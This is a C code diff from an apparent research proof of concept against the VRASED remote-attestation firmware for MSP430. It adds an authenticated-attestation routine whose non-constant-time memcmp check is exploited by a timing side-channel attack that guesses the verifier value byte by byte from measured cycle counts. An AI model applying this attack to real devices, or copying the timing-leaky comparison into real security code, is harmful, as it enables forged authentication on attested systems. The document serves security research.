@@ -7,6 +7,10 @@
 #define ATTEST_DATA_ADDR 0xE000
 #define ATTEST_SIZE 0x20
 
+// fields for VRASED_A, in unprotected DMEM for our PoC
+#define CTR_ADDR 0x0270
+#define VRF_AUTH 0x0250
+
 extern void
 hmac(
   uint8_t *mac,
@@ -15,6 +19,49 @@ hmac(
   uint8_t *data,
   uint32_t datalen
 );
+
+#if __ATTACK == 4
+
+int attack_iteration = 0;
+
+// VRASED_A: authenticated attestation
+// we based the code on the RATA implementation, which only differs from the code
+// in the appendix of VRASED in one place: it uses the MAC region to pass the challenge
+// (which the base VRASED also does)
+
+__attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry()
+{
+  uint8_t key[64] = {0};
+  uint8_t verification[32] = {0};
+
+  if (memcmp((uint8_t*) MAC_ADDR, (uint8_t*) CTR_ADDR, 32) > 0)
+  {
+    memcpy(key, (uint8_t*) KEY_ADDR, 64);
+    hmac((uint8_t*) verification, (uint8_t*) key, (uint32_t) 64, (uint8_t*)MAC_ADDR, (uint32_t) 32);
+
+    // Verifier Authentication before calling HMAC
+    if (memcmp((uint8_t*) VRF_AUTH, verification, 32) == 0)
+    {
+      memcpy((uint8_t*) CTR_ADDR, (uint8_t*) MAC_ADDR, 32);
+
+      // Key derivation function for rest of the computation of HMAC
+      hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) verification, (uint32_t) 32);
+
+      // HMAC on the attestation region. Stores the result in MAC_ADDR itself.
+      hmac((uint8_t*) MAC_ADDR, (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
+    }
+  }
+
+  // setting the return addr:
+  __asm__ volatile("mov    #0x0300,   r6" "\n\t");
+  __asm__ volatile("mov    @(r6),     r6" "\n\t");
+
+  // postamble
+  __asm__ volatile("add     #70,    r1" "\n\t");
+  __asm__ volatile( "br      #__mac_leave" "\n\t");
+}
+
+#else
 
 __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() {
 
@@ -47,6 +94,8 @@ __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() 
     __asm__ volatile("add     #70,    r1" "\n\t");
     __asm__ volatile( "br      #__mac_leave" "\n\t");
 }
+
+#endif
 
 __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMAC_SHA2_256_hmac_exit() {
     __asm__ volatile("br   r6" "\n\t");
@@ -93,6 +142,34 @@ void leak_key(uint8_t *buf, int start, int end)
 
 void VRASED (uint8_t *challenge, uint8_t *response) {
     printf("Attack: %d\n", __ATTACK);
+
+    #if __ATTACK == 4
+      attack4:
+      // modifying the counter address for demonstration purposes; normally this
+      // would also be protected (but its value is known to the attacker)
+      my_memset(CTR_ADDR, 32, 0);
+
+      my_memset(VRF_AUTH, 32, 0);
+      uint8_t * verification = (uint8_t*) VRF_AUTH;
+      // correct verification value: 444eb44a4a018344b057451667ac6e8414f7736c329edd7fff8d467cb1f5c5d3
+      switch (attack_iteration) {
+      case 0:
+        verification[0] = 0x42;
+        verification[1] = 0x42;
+        break;
+      case 1:
+        verification[0] = 0x44;
+        verification[1] = 0x42;
+        break;
+      case 2:
+        verification[0] = 0x44;
+        verification[1] = 0x4e;
+        break;
+      }
+
+      // setting up the clock for time measurement
+      TACTL = TACLR | MC_2 | TASSEL_2;
+    #endif
 
     #if __ATTACK == 1
       leak_key((uint8_t*) KEY_ADDR, 31, 64);
@@ -166,6 +243,19 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     // Enable interrupts:
     __eint();
+
+    #if __ATTACK == 4
+      uint16_t tar = TAR;
+      printf("Attack iteration %d, execution took %d cycles (%d bytes correct)\n",
+        attack_iteration,
+        tar,
+        (tar - 14511) / 13);
+      if (attack_iteration < 2) {
+        attack_iteration++;
+        goto attack4;
+      }
+      // guessed cycles: 14511 + (guessed * 13)
+    #endif
 
     // Return the HMAC value to the application:
     my_memcpy(response, (uint8_t*)MAC_ADDR, 32);
